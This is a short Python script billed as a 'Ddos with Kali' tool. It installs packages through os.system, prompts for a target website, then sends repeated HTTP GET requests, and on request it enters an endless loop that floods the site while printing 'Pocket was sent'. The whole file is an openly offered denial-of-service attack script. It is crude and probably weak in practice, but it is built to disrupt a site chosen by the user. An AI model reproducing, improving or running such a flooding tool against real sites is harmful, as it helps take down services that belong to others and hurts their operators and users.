import os

os.system('pip install termcolor && pip install colored && pip install requests && clear')
import termcolor
from termcolor import colored

def main():

    print(colored("************************",'blue'))
    print(colored("*                      *",'blue'))
    print(colored("*    Ddos with Kali    *",'blue'))
    print(colored("*                      *",'blue'))
    print(colored("************************",'blue'))

    print(colored("| made by: KaMrAn ZoNe |\n", 'green'))


main()

import requests
def dos():

        s = input(colored("enter your target\n example: site.ir\n\n ~> ",'magenta'))

        r = requests.get("http://"+s)

        print(colored("\nPocket was sent",'red'))

        r = requests.get("http://"+s)

        print(colored("Pocket was sent",'blue'))

        r = requests.get("http://"+s)

        print(colored("Pocket was sent",'red'))

        r = requests.get("http://"+s)

        print(colored("Pocket was sent",'blue'))

        c = input(colored("Do you want continue? y/n? ~> ",'yellow'))

        if c == 'y':
            while True:
                r = requests.get("http://"+s)
                print(colored("Pocket was sent", 'red'))
                r = requests.get("http://"+s)
                print(colored("Pocket was sent", 'blue'))
        elif c == 'n':
            os.system('clear')
            main()
            dos()


dos()
